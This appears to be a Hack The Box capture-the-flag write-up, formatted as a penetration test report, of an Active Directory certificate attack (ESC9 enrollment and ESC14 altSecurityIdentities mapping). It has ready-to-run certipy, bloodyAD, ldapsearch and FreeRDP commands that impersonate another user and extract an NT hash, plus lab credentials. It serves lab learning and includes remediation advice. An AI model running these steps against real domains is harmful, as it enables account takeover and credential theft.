# HTB Handler — Complete Technical Penetration Testing & Exploitation Report

**Target:** Handler  
**Environment:** HTB – Active Directory  
**Domain:** `htb-airways.htb`  
**Domain Controller:** `DC01.htb-airways.htb`  
**Domain Controller IP:** `10.8.0.1`  
**Internal SRV01 IP:** `192.168.37.2`  
**Primary Tools:** Certipy, BloodyAD, Impacket, OpenSSL, LDAP utilities, Nmap, FreeRDP  
**Assessment Date:** 23 November 2026  
**Status:** Toby Ellis account compromise achieved; SRV01 interactive RDP session initialization remains under investigation.

---

## TABLE OF CONTENTS

1. [Executive Summary](#1-executive-summary)
2. [Scope and Environment](#2-scope-and-environment)
3. [Initial Foothold and DPAPI Investigation](#3-initial-foothold-and-dpapi-investigation)
4. [Webmail Enumeration and Certificate Recovery](#4-webmail-enumeration-and-certificate-recovery)
5. [Kerberos PKINIT Authentication](#5-kerberos-pkinit-authentication)
6. [Active Directory Certificate Services Enumeration](#6-active-directory-certificate-services-enumeration)
7. [HTBA-SmartcardLogon Template Analysis](#7-htba-smartcardlogon-template-analysis)
8. [ESC9 – Certificate Enrollment](#8-esc9--certificate-enrollment)
9. [ESC14 – altSecurityIdentities Mapping](#9-esc14--altsecurityidentities-mapping)
10. [Toby Ellis Account Compromise](#10-toby-ellis-account-compromise)
11. [Kerberos Ticket and NT Hash Extraction](#11-kerberos-ticket-and-nt-hash-extraction)
12. [Active Directory Permission Analysis](#12-active-directory-permission-analysis)
13. [Internal DNS Enumeration](#13-internal-dns-enumeration)
14. [SRV01 Network Discovery](#14-srv01-network-discovery)
15. [Remote Desktop Authentication](#15-remote-desktop-authentication)
16. [Troubleshooting and Failed Attempts](#16-troubleshooting-and-failed-attempts)
17. [Final Attack Chain](#17-final-attack-chain)
18. [Security Impact](#18-security-impact)
19. [Remediation Recommendations](#19-remediation-recommendations)
20. [Conclusion](#20-conclusion)
21. [Evidence and Artifact Inventory](#21-evidence-and-artifact-inventory)

---

## 1. EXECUTIVE SUMMARY

During the assessment of the HTB Handler machine, an Active Directory attack path was identified involving certificate-based authentication and insecure certificate identity mapping.

The investigation involved recovering a privileged user's certificate, authenticating through Kerberos PKINIT, identifying an exploitable certificate template, and modifying the `altSecurityIdentities` attribute of another domain account.

The primary attack chain involved:

- Recovery of the `w.zhang.adm` certificate.
- Authentication as `w.zhang.adm` using PKINIT.
- Enumeration of Active Directory Certificate Services.
- Identification of the `HTBA-SmartcardLogon` certificate template.
- Certificate enrollment through the template.
- Identification of write access to Toby Ellis's `altSecurityIdentities` attribute.
- Mapping the newly issued certificate to Toby Ellis.
- Successful Kerberos PKINIT authentication as Toby.
- Extraction of Toby's NT hash.

The successful authentication output confirmed:

```
[*] Got TGT
[*] Got hash for 't.ellis@htb-airways.htb'
```

The recovered NT hash was:

```
fe92aaf479e32cb0e9c40a929c8212b8
```

This demonstrated successful compromise of Toby Ellis's domain identity.

Further investigation identified SRV01 at `192.168.37.2`. An RDP connection subsequently reached the Windows Local Session Manager, but a stable interactive desktop session has not yet been confirmed.

---

## 2. SCOPE AND ENVIRONMENT

### 2.1 Domain Information

| Parameter | Value |
|-----------|-------|
| Domain | `htb-airways.htb` |
| NetBIOS Domain | `HTB-AIRWAYS` |
| Domain Controller | `DC01.htb-airways.htb` |
| DC IP | `10.8.0.1` |
| Webmail | `webmail.htb-airways.htb` |
| SRV01 | `srv01.htb-airways.htb` |
| SRV01 Internal IP | `192.168.37.2` |
| CA | `htb-airways-DC01-CA` |
| Certificate Template | `HTBA-SmartcardLogon` |

### 2.2 Important Accounts

| Account | Purpose |
|---------|---------|
| `ext.dmalik` | Initial foothold identity |
| `w.zhang` | Webmail and DPAPI investigation |
| `w.zhang.adm` | Privileged certificate enrollment identity |
| `t.ellis` | Target account for certificate mapping |

### 2.3 Working Directory

The main investigation was conducted from:

```
~/HTB/Handler/cert
```

The system was running CachyOS/Arch Linux.

---

## 3. INITIAL FOOTHOLD AND DPAPI INVESTIGATION

### 3.1 Initial Access Context

The initial investigation involved the `ext.dmalik` account and the examination of Active Directory and user-related artifacts.

The investigation moved toward the DPAPI credential-protection mechanism and the recovery of certificate-related material.

DPAPI stands for Data Protection API.

It is a Windows mechanism used to protect sensitive information, including:

- Stored credentials.
- Browser secrets.
- Private keys.
- Application authentication material.
- User-specific encrypted data.

DPAPI-protected data is commonly tied to a Windows user context and its associated master keys.

### 3.2 DPAPI Investigation

The investigation involved identifying DPAPI-related material and recovering usable decryption information.

Relevant artifacts included:

- DPAPI master-key information.
- Protected credential material.
- Decrypted application data.
- Certificate-related files.

The investigation eventually enabled access to the webmail-related certificate material.

**Technical reporting note:** The complete original DPAPI extraction command sequence is not retained in the current evidence record. It should be supplemented with the original terminal history rather than reconstructed from assumptions.

---

## 4. WEBMAIL ENUMERATION AND CERTIFICATE RECOVERY

### 4.1 Webmail Discovery

The domain's webmail service was identified at:

```
webmail.htb-airways.htb
```

The investigation focused on recovering authentication material associated with the user.

A backup email in the Roundcube webmail environment contained the administrator certificate:

```
w.zhang.adm.pfx
```

The certificate was protected using an empty password.

### 4.2 Certificate Inspection

The recovered certificate was inspected with OpenSSL.

```bash
openssl pkcs12 -in w.zhang.adm.pfx \
-clcerts -nokeys -passin pass: |
openssl x509 -noout -subject -issuer -dates
```

Observed certificate information:

```
subject=DC=htb, DC=htb-airways,
OU=Departments, OU=Information Technology,
CN=Wei Zhang (adm)

issuer=DC=htb, DC=htb-airways,
CN=htb-airways-DC01-CA

notBefore=Sep  2 07:23:41 2026 GMT
notAfter=Sep  2 07:23:41 2027 GMT
```

The private key was also confirmed to be present:

```bash
openssl pkcs12 -in w.zhang.adm.pfx \
-nocerts -nodes -passin pass: |
head -n 2
```

Output included:

```
Bag Attributes
friendlyName:
```

The PFX contained certificate authentication material suitable for the subsequent PKINIT investigation.

---

## 5. KERBEROS PKINIT AUTHENTICATION

### 5.1 Understanding PKINIT

PKINIT is an extension to Kerberos that allows public-key cryptography to be used during initial authentication.

Traditional Kerberos authentication commonly relies on password-derived credentials.

PKINIT allows a client to authenticate using a certificate and its corresponding private key.

The simplified workflow is:

1. Client presents certificate-based authentication material.
2. Domain Controller validates the certificate.
3. KDC processes the certificate identity.
4. KDC issues a Kerberos Ticket Granting Ticket.
5. Client can request service tickets.

### 5.2 Authenticate as w.zhang.adm

```bash
certipy auth \
-pfx w.zhang.adm.pfx \
-username w.zhang.adm \
-domain htb-airways.htb \
-dc-ip 10.8.0.1
```

The authentication process produced a Kerberos credential cache.

The cache was subsequently inspected using:

```bash
klist
```

The original principal was:

```
w.zhang.adm@HTB-AIRWAYS.HTB
```

The credential cache contained a TGT:

```
krbtgt/HTB-AIRWAYS.HTB@HTB-AIRWAYS.HTB
```

This established certificate-based authentication as the privileged account.

---

## 6. ACTIVE DIRECTORY CERTIFICATE SERVICES ENUMERATION

### 6.1 AD CS Overview

Active Directory Certificate Services provides certificate issuance and management for domain environments.

AD CS is frequently integrated with:

- Kerberos authentication.
- Smartcard logon.
- Client authentication.
- Domain user authentication.
- Certificate-based service authentication.

Misconfigured templates and certificate identity mapping can create privilege-escalation paths.

### 6.2 Certificate Authority

The identified Certificate Authority was:

```
htb-airways-DC01-CA
```

The relevant certificate template was:

```
HTBA-SmartcardLogon
```

The investigation established that the `w.zhang.adm` account was authorized to enroll in the template.

### 6.3 Template Properties

The previously enumerated template showed:

| Property | Observed Configuration |
|----------|------------------------|
| Template | `HTBA-SmartcardLogon` |
| Enrollment Rights | Wei Zhang (adm) |
| Client Authentication EKU | Present |
| Smart Card Logon EKU | Present |
| Exportable Private Key | Enabled |
| No Security Extension | Enabled |
| Enrollee Supplies Subject | Disabled |
| Manager Approval | Not Required |
| Authorized Signatures | Not Required |

The most significant property was the absence of the SID security extension.

This configuration was relevant to the ESC9 attack path.

---

## 7. HTBA-SMARTCARDLOGON TEMPLATE ANALYSIS

The `HTBA-SmartcardLogon` template was identified as the primary attack vector through the following characteristics:

### 7.1 Template Configuration Analysis

```
Template Name: HTBA-SmartcardLogon
Display Name: HTB Airways Employee Smartcard Logon
Certificate Authorities: htb-airways-DC01-CA
Enabled: True
Client Authentication: True
Enrollment Agent: False
Any Purpose: False
Enrollee Supplies Subject: False
Certificate Name Flag: SubjectRequireCommonName
Enrollment Flag: AutoEnrollment, NoSecurityExtension
Private Key Flag: ExportableKey
Extended Key Usage: Smart Card Logon, Client Authentication
Requires Manager Approval: False
Requires Key Archival: False
Authorized Signatures Required: 0
Schema Version: 2
Validity Period: 1 year
Renewal Period: 6 weeks
Minimum RSA Key Length: 2048
```

### 7.2 Permissions

```
Enrollment Permissions
  Enrollment Rights: HTB-AIRWAYS.HTB\Wei Zhang (adm)

Object Control Permissions
  Owner: HTB-AIRWAYS.HTB\Enterprise Admins
  Full Control Principals: HTB-AIRWAYS.HTB\Domain Admins, Local System, Enterprise Admins
  Write Owner Principals: HTB-AIRWAYS.HTB\Domain Admins, Local System, Enterprise Admins
  Write Dacl Principals: HTB-AIRWAYS.HTB\Domain Admins, Local System, Enterprise Admins
```

### 7.3 Vulnerabilities Identified

```
[+] User Enrollable Principals: HTB-AIRWAYS.HTB\Wei Zhang (adm)
[!] Vulnerabilities
  ESC9: Template has no security extension.
[*] Remarks
  ESC9: Other prerequisites may be required for this to be exploitable.
```

The absence of the SID security extension (`NoSecurityExtension`) combined with the `Enrollee Supplies Subject: False` configuration meant the CA would ignore any UPN/SAN supplied by the enrollee, but the certificate could still be mapped to another user through `altSecurityIdentities`.

---

## 8. ESC9 – CERTIFICATE ENROLLMENT

### 8.1 Understanding ESC9

ESC9 concerns certificate templates configured without the SID security extension.

The absence of this extension can create certificate identity-mapping weaknesses when combined with other Active Directory conditions.

In this investigation, the certificate was issued to Wei Zhang (adm), but the certificate was subsequently used in an explicit mapping to Toby Ellis.

The template's subject configuration did not allow arbitrary enrollee-supplied subject information.

Therefore, the certificate was not expected to contain Toby's UPN simply because a different UPN was requested.

### 8.2 Certificate Enrollment

The administrator Kerberos cache was selected:

```bash
export KRB5CCNAME="$PWD/w.zhang.adm.ccache"
```

The certificate was requested using Certipy 5.1.0.

```bash
certipy req \
-u w.zhang.adm@htb-airways.htb \
-k \
-no-pass \
-dc-ip 10.8.0.1 \
-target DC01.htb-airways.htb \
-ca htb-airways-DC01-CA \
-template HTBA-SmartcardLogon \
-out fresh_toby_mapping.pfx
```

Observed result:

```
Certipy v5.1.0

[!] DC host (-dc-host) not specified and Kerberos authentication is used.
[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Saving certificate and private key to 'fresh_toby_mapping.pfx'
[*] Wrote certificate and private key to 'fresh_toby_mapping.pfx'
```

The certificate request was successful.

Request ID: `17`

### 8.3 Certificate Inspection

```bash
openssl pkcs12 -in fresh_toby_mapping.pfx \
-clcerts -nokeys |
openssl x509 -noout -subject -issuer -serial -dates \
-ext subjectAltName \
-ext subjectKeyIdentifier \
-ext extendedKeyUsage
```

Observed result:

```
subject=CN=Wei Zhang (adm)
issuer=DC=htb, DC=htb-airways, CN=htb-airways-DC01-CA
serial=1800000011791C80644A7DE910000100000011
notBefore=Nov 23 10:28:05 2026 GMT
notAfter=Nov 23 10:28:05 2027 GMT
X509v3 Extended Key Usage:
Microsoft Smartcard Login, TLS Web Client Authentication
```

The private key was confirmed:

```bash
openssl pkcs12 -in fresh_toby_mapping.pfx \
-nocerts -nodes |
grep -E 'BEGIN.*PRIVATE KEY'
```

Output: `-----BEGIN PRIVATE KEY-----`

### 8.4 Subject Key Identifier Extraction

The certificate's Subject Key Identifier was extracted.

```bash
openssl pkcs12 -in fresh_toby_mapping.pfx \
-clcerts -nokeys -passin pass: |
openssl x509 -noout -ext subjectKeyIdentifier
```

Observed value:

```
C9:C0:67:39:EB:12:91:57:25:C8:AD:11:0B:4A:38:DA:76:DD:32:8B
```

Compact SKI:

```
C9C06739EB12915725C8AD110B4A38DA76DD328B
```

This value was used for explicit certificate mapping.

---

## 9. ESC14 – ALTSECURITYIDENTITIES MAPPING

### 9.1 Understanding altSecurityIdentities

The Active Directory attribute `altSecurityIdentities` is used to associate certificate identities with Active Directory accounts.

Certificate mapping can use several identification methods, including:

- Issuer and serial number.
- Subject and issuer.
- Subject Key Identifier.
- Other supported certificate mapping forms.

The investigation identified write access to this attribute on Toby Ellis's account.

This allowed the newly issued certificate to be explicitly associated with Toby's AD identity.

### 9.2 Toby Ellis Account Details

```
Distinguished Name: CN=Toby Ellis,OU=Ground Operations,OU=Departments,DC=htb-airways,DC=htb
SAM Account Name: t.ellis
UPN: t.ellis@htb-airways.htb
SID: S-1-5-21-2807179013-311950797-2107105437-5684
```

### 9.3 Permission Analysis

The Toby account's security descriptor was extracted and analyzed using LDAP with Kerberos GSSAPI authentication and the Microsoft Security Descriptor Flags control (OID: 1.2.840.113556.1.4.801).

The relevant ACE (ACE #4) had:

```
ACE Type: 5 (ACCESS_ALLOWED_OBJECT_ACE)
Access Mask: 0x30
Trustee SID: S-1-5-21-2807179013-311950797-2107105437-5639 (w.zhang.adm)
Object Type GUID: 00fbf30c-91fe-11d1-aebc-0000f80367c1
```

The access mask decomposed into:
- `0x10` = ADS_RIGHT_DS_READ_PROP
- `0x20` = ADS_RIGHT_DS_WRITE_PROP

The Object Type GUID `00fbf30c-91fe-11d1-aebc-0000f80367c1` corresponds to the `altSecurityIdentities` attribute.

**Finding:** `w.zhang.adm` has direct object-specific Read Property and Write Property permissions over Toby Ellis's `altSecurityIdentities` attribute.

### 9.4 Initial Mapping Attempts

An earlier issuer-and-serial mapping was attempted. However, the subsequent PKINIT authentication failed with:

```
Name mismatch between certificate and user 't.ellis'
```

The serial representation and issuer mapping were not fully validated at that stage.

The investigation then moved to the certificate's actual SKI.

### 9.5 Successful SKI Mapping

The certificate was mapped to Toby using BloodyAD.

```bash
bloodyAD \
--host DC01.htb-airways.htb \
-d htb-airways.htb \
-k set object t.ellis altSecurityIdentities \
-v 'X509:<SKI>C9C06739EB12915725C8AD110B4A38DA76DD328B'
```

Observed result:

```
[+] t.ellis's altSecurityIdentities has been updated
```

### 9.6 Verify the Mapping

```bash
bloodyAD \
--host DC01.htb-airways.htb \
-d htb-airways.htb \
-k get object t.ellis \
--attr altSecurityIdentities
```

Observed output:

```
distinguishedName:
CN=Toby Ellis,OU=Ground Operations,OU=Departments,DC=htb-airways,DC=htb

altSecurityIdentities:
X509:<SKI>C9C06739EB12915725C8AD110B4A38DA76DD328B
```

The LDAP readback confirmed that the mapping was stored correctly.

---

## 10. TOBY ELLIS ACCOUNT COMPROMISE

### 10.1 Understanding the Certificate Mapping Result

The certificate's original subject was:

```
CN=Wei Zhang (adm)
```

However, the certificate's SKI was explicitly associated with Toby's account through:

```
altSecurityIdentities
```

The KDC was therefore able to authenticate the certificate as Toby.

This is the critical distinction: **The certificate's original subject did not need to be Toby's username for the explicit mapping to work.**

### 10.2 PKINIT as Toby Ellis

```bash
certipy auth \
-pfx fresh_toby_mapping.pfx \
-username t.ellis \
-domain htb-airways.htb \
-dc-ip 10.8.0.1
```

Successful output:

```
Certipy v5.1.0

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 't.ellis@htb-airways.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 't.ellis.ccache'
[*] Wrote credential cache to 't.ellis.ccache'
[*] Trying to retrieve NT hash for 't.ellis'
[*] Got hash for 't.ellis@htb-airways.htb':
aad3b435b51404eeaad3b435b51404ee:fe92aaf479e32cb0e9c40a929c8212b8
```

This was the decisive successful authentication result.

The message `No identities found in this certificate` did not prevent authentication because the certificate was explicitly mapped to Toby in Active Directory.

### 10.3 Recovered NT Hash

The recovered NTLM hash was:

```
fe92aaf479e32cb0e9c40a929c8212b8
```

Full LM:NT representation:

```
aad3b435b51404eeaad3b435b51404ee:fe92aaf479e32cb0e9c40a929c8212b8
```

**Credential handling warning:** The recovered hash is authentication material. It should be kept in restricted lab notes and not included in public write-ups unless redacted.

---

## 11. KERBEROS TICKET MANAGEMENT

### 11.1 Select Toby's Cache

```bash
export KRB5CCNAME="$PWD/t.ellis.ccache"
```

Verify:

```bash
klist
```

Observed principal:

```
Default principal: t.ellis@HTB-AIRWAYS.HTB
Ticket: krbtgt/HTB-AIRWAYS.HTB@HTB-AIRWAYS.HTB
```

### 11.2 Why the Ticket Matters

The Kerberos credential cache stores tickets obtained during authentication.

A TGT can be used to request service tickets for domain services without repeating the original certificate authentication process.

The cache was retained for later service authentication attempts.

---

## 12. ACTIVE DIRECTORY PERMISSION ANALYSIS

### 12.1 Security Descriptor Retrieval

The security descriptor was retrieved using the LDAP_SERVER_SD_FLAGS_OID control:

```bash
export KRB5CCNAME="$PWD/w.zhang.adm.ccache"

ldapsearch -LLL \
  -H ldap://DC01.htb-airways.htb \
  -Y GSSAPI \
  -E '!1.2.840.113556.1.4.801=::MAMCAQQ=' \
  -b 'CN=Toby Ellis,OU=Ground Operations,OU=Departments,DC=htb-airways,DC=htb' \
  -s base \
  nTSecurityDescriptor
```

The Base64-encoded security descriptor was saved to `toby_sd.ldif`.

### 12.2 DACL Parsing with Impacket

A Python parser using Impacket's `SR_SECURITY_DESCRIPTOR` was created:

```python
import base64
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID

with open("toby_sd.ldif", "r") as f:
    lines = f.readlines()

value = ""
reading = False
for line in lines:
    if line.startswith("nTSecurityDescriptor:: "):
        value = line.split(":: ", 1)[1].strip()
        reading = True
    elif reading and line.startswith(" "):
        value += line.strip()
    elif reading:
        break

raw = base64.b64decode(value)
sd = SR_SECURITY_DESCRIPTOR(data=raw)

def sid_string(value):
    if not value:
        return "None"
    sid = LDAP_SID(data=value)
    return sid.formatCanonical()

print("Owner:", sid_string(sd["OwnerSid"]))
print("Group:", sid_string(sd["GroupSid"]))
print("\nDACL ACEs:")
dacl = sd["Dacl"]
for i, ace in enumerate(dacl.aces):
    body = ace["Ace"]
    print(f"\nACE #{i}")
    print("ACE type:", ace["AceType"])
    print("ACE flags:", hex(ace["AceFlags"]))
    if "Mask" in body.fields:
        print("Access mask:", hex(body["Mask"]["Mask"]))
    if "Sid" in body.fields:
        print("Trustee SID:", sid_string(body["Sid"].getData()))
    if "ObjectType" in body.fields:
        print("Object type GUID:", body["ObjectType"])
    if "InheritedObjectType" in body.fields:
        print("Inherited object GUID:", body["InheritedObjectType"])
```

### 12.3 Key Findings

The parser returned 51 ACE entries. The critical finding was **ACE #4**:

| Field | Result |
|-------|--------|
| ACE Number | 4 |
| ACE Type | 5 (ACCESS_ALLOWED_OBJECT_ACE) |
| ACE Classification | Access-allowed object ACE |
| Trustee SID | `S-1-5-21-2807179013-311950797-2107105437-5639` |
| Trustee | `w.zhang.adm` |
| Access Mask | `0x30` (Read Property + Write Property) |
| Object Type GUID | `00fbf30c-91fe-11d1-aebc-0000f80367c1` |
| Attribute | `altSecurityIdentities` |

This establishes a direct, attribute-specific ACE granting the compromised account modification rights over the certificate mapping attribute.

---

## 13. INTERNAL DNS ENUMERATION

### 13.1 Initial DNS Resolution Problem

The local `/etc/hosts` configuration initially mapped multiple hostnames to the same address:

```
10.8.0.1 DC01.htb-airways.htb
webmail.htb-airways.htb
srv01.htb-airways.htb
srv02.htb-airways.htb
```

This caused SRV01 to resolve to the Domain Controller IP.

### 13.2 Query the Domain Controller DNS Directly

```bash
dig @10.8.0.1 srv01.htb-airways.htb A +short
```

Observed result: `192.168.37.2`

Therefore: **SRV01 = 192.168.37.2**

### 13.3 Correct Hosts Configuration

```
10.8.0.1 DC01.htb-airways.htb webmail.htb-airways.htb
192.168.37.2 srv01.htb-airways.htb
```

### 13.4 Verify Resolution

```bash
getent hosts srv01.htb-airways.htb
```

Expected: `192.168.37.2 srv01.htb-airways.htb`

---

## 14. SRV01 NETWORK DISCOVERY

### 14.1 Initial DC Port Scan

```bash
nmap -Pn -sV -p 445,3389,5985,5986 10.8.0.1
```

Observed results:

| Port | State | Service |
|------|-------|---------|
| 445 | Open | Microsoft-DS |
| 3389 | Filtered | MS-WBT-Server |
| 5985 | Open | HTTP / WinRM |
| 5986 | Filtered | WinRM over TLS |

**Important:** These results describe the Domain Controller, not SRV01.

### 14.2 SRV01 Service Enumeration

The discovered internal IP: `192.168.37.2`

---

## 15. REMOTE DESKTOP AUTHENTICATION

### 15.1 Kerberos-based RDP

```bash
export KRB5CCNAME="$PWD/t.ellis.ccache"

xfreerdp3 /v:srv01.htb-airways.htb \
/u:t.ellis \
/d:HTB-AIRWAYS.HTB \
/kerberos:cache:$PWD/t.ellis.ccache \
/auth-pkg-list:none,kerberos \
/cert:ignore \
/sec:nla
```

### 15.2 Smartcard Logon Investigation

The Windows login screen displayed:

```
You must use Windows Hello or a smart card to sign in.
```

This indicated that the interactive login path required an approved smartcard or Windows Hello credential.

### 15.3 PEM File Extraction

Certificate extraction:
```bash
openssl pkcs12 \
-in fresh_toby_mapping.pfx \
-clcerts -nokeys \
-passin pass: \
-out tellis-smartcard.crt.pem
```

Private key extraction:
```bash
openssl pkcs12 \
-in fresh_toby_mapping.pfx \
-nocerts -nodes \
-passin pass: \
-out tellis-smartcard.key.pem

chmod 600 tellis-smartcard.key.pem
```

### 15.4 Key Match Verification

```bash
# Certificate public key
openssl x509 -in tellis-smartcard.crt.pem -pubkey -noout | openssl sha256

# Private key public component
openssl pkey -in tellis-smartcard.key.pem -pubout | openssl sha256
```

The resulting SHA-256 hashes matched, confirming the key pair.

### 15.5 FreeRDP Smartcard Command

```bash
xfreerdp3 /v:srv01.htb-airways.htb \
/u:t.ellis \
/d:HTB-AIRWAYS.HTB \
/smartcard-logon:cert:$PWD/tellis-smartcard.crt.pem,key:$PWD/tellis-smartcard.key.pem,pin:0000 \
/kerberos:cache:$PWD/t.ellis.ccache \
/auth-pkg-list:none,kerberos \
/cert:ignore \
/sec:nla
```

The PIN `0000` was taken from the email notes and was not independently confirmed for the extracted certificate.

### 15.6 Local Session Manager Stage

The RDP connection progressed to the Windows login/session interface.

Messages observed:
```
Please wait for the Local Session Manager
[INFO] Local framebuffer format PIXEL_FORMAT_BGRX32
[INFO] Remote framebuffer format PIXEL_FORMAT_BGRA32
```

A later attempt reported:
```
ERRINFO_LOGOFF_BY_USER
```

This indicates that the server terminated the session.

**Final interpretation:** RDP transport and graphical session initialization were reached, but successful completion of the interactive Windows logon was not confirmed.

---

## 16. TROUBLESHOOTING AND FAILED ATTEMPTS

### 16.1 Incorrect Certipy Option Placement
**Failed:** `certipy -v auth ...` (prints version)
**Correct:** `certipy auth -pfx ...`

### 16.2 Incorrect BloodyAD Read Syntax
**Failed:** `bloodyAD ... get object t.ellis altSecurityIdentities`
**Correct:** `bloodyAD ... get object t.ellis --attr altSecurityIdentities`

### 16.3 Incorrect SRV01 IP Resolution
Initially SRV01 resolved to `10.8.0.1`. Direct DNS query identified `192.168.37.2`.

### 16.4 Missing PEM Files
FreeRDP returned `Failed to read PEM from file` - files needed to be extracted from PFX first.

### 16.5 Certificate Identity Assumption
Certipy repeatedly printed `No identities found in this certificate` but PKINIT succeeded after explicit AD mapping.

### 16.6 WMI Access Denied
`rpc_s_access_denied` - successful authentication as Toby did not establish WMI administrative permissions.

### 16.7 PsExec Administrative Share Access Denied
`ADMIN$ is not writable`, `C$ is not writable` - insufficient administrative share access.

---

## 17. FINAL ATTACK CHAIN

```
Initial Foothold (ext.dmalik)
         |
         v
DPAPI Investigation & Credential Recovery
         |
         v
Roundcube Webmail Access (w.zhang / HelloKitty)
         |
         v
Recovery of w.zhang.adm.pfx (from email backup)
         |
         v
PKINIT as w.zhang.adm (Kerberos TGT + NT Hash)
         |
         v
AD CS Enumeration (certipy find)
         |
         v
HTBA-SmartcardLogon Template Identified
         |
         v
ESC9 Certificate Enrollment (Request ID 17)
         |
         v
Certificate Issued to "Wei Zhang (adm)"
         |
         v
SKI Extracted: C9C06739EB12915725C8AD110B4A38DA76DD328B
         |
         v
altSecurityIdentities Write Permission Identified on t.ellis
         |
         v
ESC14 SKI Mapping via BloodyAD
         |
         v
X509:<SKI>C9C06739EB12915725C8AD110B4A38DA76DD328B
         |
         v
PKINIT as t.ellis (Kerberos TGT)
         |
         v
Toby's NT Hash Recovered: fe92aaf479e32cb0e9c40a929c8212b8
         |
         v
Internal DNS Discovery (SRV01 = 192.168.37.2)
         |
         v
RDP Connection Established (Windows Local Session Manager)
         |
         v
Interactive Session Initialization (Under Investigation)
```

---

## 18. SECURITY IMPACT

### 18.1 Certificate Enrollment Abuse
A user with enrollment permissions could obtain a certificate through a template that lacked the SID security extension.

### 18.2 Insecure Certificate Identity Mapping
Write access to another user's `altSecurityIdentities` attribute allowed a certificate to be associated with that user's Active Directory identity.

### 18.3 Kerberos Identity Compromise
The KDC accepted the mapped certificate during PKINIT authentication, allowing authentication as Toby Ellis without knowledge of Toby's original password.

### 18.4 NT Hash Extraction
The successful PKINIT workflow allowed Certipy to retrieve Toby's NT hash, increasing the risk of credential reuse and subsequent lateral movement.

### 18.5 Remote Access Exposure
The obtained account credentials provided a basis for investigating access to internal Windows services. However, successful domain authentication did not automatically grant local administrator privileges on SRV01.

---

## 19. REMEDIATION RECOMMENDATIONS

### 19.1 Secure Certificate Templates
- Review all published certificate templates.
- Disable templates that are no longer required.
- Review enrollment permissions.
- Avoid configurations that permit unsafe certificate identity mapping.
- Ensure appropriate SID security extensions are included.
- Require appropriate approval and authorization for sensitive templates.

### 19.2 Restrict altSecurityIdentities Permissions
- Audit WriteProperty permissions on user objects.
- Remove unnecessary delegated write permissions.
- Restrict modification of `altSecurityIdentities`.
- Monitor changes to certificate mapping attributes.

### 19.3 Enforce Strong Certificate Mapping
- Apply current Microsoft certificate mapping security updates.
- Enforce strong certificate binding.
- Monitor KDC certificate mapping failures.
- Investigate unexpected certificate-to-account associations.

### 19.4 Improve Kerberos Security
- Monitor certificate-based Kerberos authentication.
- Monitor unexpected PKINIT usage.
- Audit privileged certificate enrollment.
- Protect private keys and credential caches.

### 19.5 Monitor Lateral Movement
- Monitor unusual SMB and WMI access.
- Review RDP logon policies.
- Monitor administrative share access.
- Investigate unusual authentication from newly compromised identities.

---

## 20. CONCLUSION

The Handler investigation demonstrated how multiple Active Directory certificate-related weaknesses can combine into an account-compromise path.

The most significant finding was the ability to enroll a certificate using the `HTBA-SmartcardLogon` template and explicitly map that certificate to Toby Ellis through the `altSecurityIdentities` attribute.

The successful PKINIT authentication demonstrated that the KDC accepted the certificate as Toby Ellis.

The recovered Kerberos TGT and NT hash confirmed that the account compromise was successful.

The investigation then identified the internal SRV01 address and established an RDP connection that progressed to the Windows Local Session Manager.

The final interactive Windows logon remains unconfirmed and should be documented as an outstanding investigation item rather than a completed compromise.

---

## 21. EVIDENCE AND ARTIFACT INVENTORY

| Artifact | Description |
|----------|-------------|
| `w.zhang.adm.pfx` | Original administrator certificate |
| `w.zhang.adm.ccache` | Administrator Kerberos cache |
| `fresh_toby_mapping.pfx` | Newly enrolled certificate |
| `t.ellis.ccache` | Toby's Kerberos cache |
| `t.ellis_cert.pfx` | Earlier enrolled certificate |
| `t.ellis_with_sid.pfx` | Earlier certificate experiment |
| `wzhang_smartcard.pfx` | Additional smartcard-related PFX |
| `smartcard.crt` | Additional certificate artifact |
| `toby_sd.ldif` | Toby security descriptor evidence |
| `mapping.ldif` | Earlier mapping experiment |
| `mapping2.ldif` | Mapping experiment |
| `mapping3.ldif` | Mapping experiment |
| `mapping_fixed.ldif` | Corrected mapping experiment |
| `adcs-full.txt` | AD CS enumeration output |
| `parse_sd.py` | Security descriptor parsing script |
| `pkinit-debug.log` | PKINIT diagnostic log |

### Important Evidence to Preserve
1. Original certificate inspection output.
2. Certipy certificate template enumeration.
3. Certificate enrollment Request ID 17.
4. Certificate SKI output.
5. Toby's DACL and ACE analysis.
6. BloodyAD successful mapping output.
7. BloodyAD LDAP readback.
8. Certipy successful Toby PKINIT output.
9. Toby's Kerberos ticket information.
10. Nmap and DNS discovery output.
11. FreeRDP session initialization logs.

---

## FINAL STATUS

| Assessment Milestone | Status |
|---------------------|--------|
| Initial foothold investigation | Performed |
| DPAPI investigation | Performed |
| Webmail certificate recovery | Successful |
| Administrator PKINIT | Successful |
| AD CS enumeration | Successful |
| ESC9 enrollment | Successful |
| altSecurityIdentities write | Successful |
| Certificate mapping verification | Successful |
| Toby PKINIT | Successful |
| Toby TGT retrieval | Successful |
| Toby NT hash retrieval | Successful |
| SRV01 DNS discovery | Successful |
| RDP connection | Reached Windows session interface |
| Interactive Windows desktop | Not yet confirmed |

**Final confirmed result:** Successful certificate-based authentication and NT hash extraction for `t.ellis`.

**Outstanding objective:** Complete and verify the interactive session on SRV01.

---

*End of Technical Report*

**Assessment:** HTB Handler  
**Environment:** HTB Active Directory Lab  
**Date:** 23 November 2026